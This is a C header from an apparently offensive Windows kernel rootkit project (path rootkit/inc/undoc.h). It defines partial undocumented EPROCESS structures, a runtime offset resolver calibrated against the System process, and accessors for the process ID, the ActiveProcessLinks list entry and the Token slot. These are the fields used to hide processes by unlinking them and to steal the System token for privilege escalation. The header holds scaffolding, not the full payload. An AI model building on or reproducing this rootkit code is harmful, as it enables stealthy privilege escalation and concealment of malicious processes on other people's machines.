/*==============================================================================
 * rootkit/inc/undoc.h
 *------------------------------------------------------------------------------
 * Partial undocumented structures + runtime EPROCESS offset resolver.
 *
 * IMPORTANT: NOTHING here is hardcoded. Offsets are calibrated at DriverEntry
 * against the running kernel's PsInitialSystemProcess (PID 4).
 *============================================================================*/
#pragma once
#include <ntddk.h>

/*==============================================================================
 * PARTIAL EPROCESS VIEW
 *------------------------------------------------------------------------------
 * Only the fields we actually touch. The real _EPROCESS is much larger and
 * its field offsets shift between Windows builds. We NEVER use hardcoded
 * offsets; all access goes through g_EprocOffsets resolved at runtime.
 *============================================================================*/
typedef struct _EPROCESS_PARTIAL {
    /* [0x000 .. resolved] opaque - reserved for fields before our targets */
    UCHAR  Reserved0[0x400];

    /* The following fields are resolved at runtime via resolve_eprocess_offsets():
     *   - UniqueProcessId     (HANDLE / ULONG64)
     *   - ActiveProcessLinks  (LIST_ENTRY)
     *   - Token               (EX_FAST_REF)
     *   - ImageFileName       (CHAR[15])
     *   - InheritedFromUniqueProcessId (optional, best effort)
     */
} EPROCESS_PARTIAL, *PEPROCESS_PARTIAL;

/*==============================================================================
 * PARTIAL KTHREAD VIEW
 *------------------------------------------------------------------------------
 * Declared for completeness. Token operations go through EPROCESS::Token.
 *============================================================================*/
typedef struct _KTHREAD_PARTIAL {
    UCHAR Reserved0[0x100];
} KTHREAD_PARTIAL, *PKTHREAD_PARTIAL;

/*==============================================================================
 * RUNTIME-RESOLVED EPROCESS OFFSETS
 *------------------------------------------------------------------------------
 * Populated by resolve_eprocess_offsets() during DriverEntry.
 * All offsets are relative to the base of the EPROCESS structure.
 *============================================================================*/
typedef struct _EPROCESS_OFFSETS {
    ULONG UniqueProcessId;                /* Offset to HANDLE/ULONG64 PID */
    ULONG ActiveProcessLinks;             /* Offset to LIST_ENTRY links */
    ULONG Token;                          /* Offset to EX_FAST_REF token */
    ULONG ImageFileName;                  /* Offset to CHAR[15] name */
    ULONG InheritedFromUniqueProcessId;   /* Best-effort, may be 0 */
} EPROCESS_OFFSETS;

/* Global offset table (initialized at DriverEntry). */
extern EPROCESS_OFFSETS g_EprocOffsets;
/* Pointer to the System process (PID 4) - alias for PsInitialSystemProcess. */
extern PEPROCESS        g_SystemProcess;

/*==============================================================================
 * OFFSET RESOLUTION
 *------------------------------------------------------------------------------
 * Calibrates all offsets against the live kernel by analyzing the System
 * process (PsInitialSystemProcess).
 *
 * Returns:
 *   STATUS_SUCCESS          - All required offsets resolved
 *   STATUS_NOT_FOUND        - One or more offsets could not be resolved
 *============================================================================*/
NTSTATUS resolve_eprocess_offsets(VOID);

/*==============================================================================
 * CONVENIENCE ACCESSORS (using resolved offsets)
 *------------------------------------------------------------------------------
 * These inline functions provide type-safe access to EPROCESS fields
 * using the runtime-calibrated offsets.
 *============================================================================*/
static __forceinline HANDLE rk_process_id(PEPROCESS p) {
    return *(PHANDLE)((PUCHAR)p + g_EprocOffsets.UniqueProcessId);
}

static __forceinline PLIST_ENTRY rk_active_links(PEPROCESS p) {
    return (PLIST_ENTRY)((PUCHAR)p + g_EprocOffsets.ActiveProcessLinks);
}

static __forceinline ULONG64* rk_token_slot(PEPROCESS p) {
    return (ULONG64*)((PUCHAR)p + g_EprocOffsets.Token);
}

static __forceinline PCHAR rk_image_name(PEPROCESS p) {
    return (PCHAR)((PUCHAR)p + g_EprocOffsets.ImageFileName);
}

/*==============================================================================
 * REQUIRED NTOSKRNL EXPORTS
 *----------------------------------------------------------------------------*/
extern PEPROCESS PsInitialSystemProcess;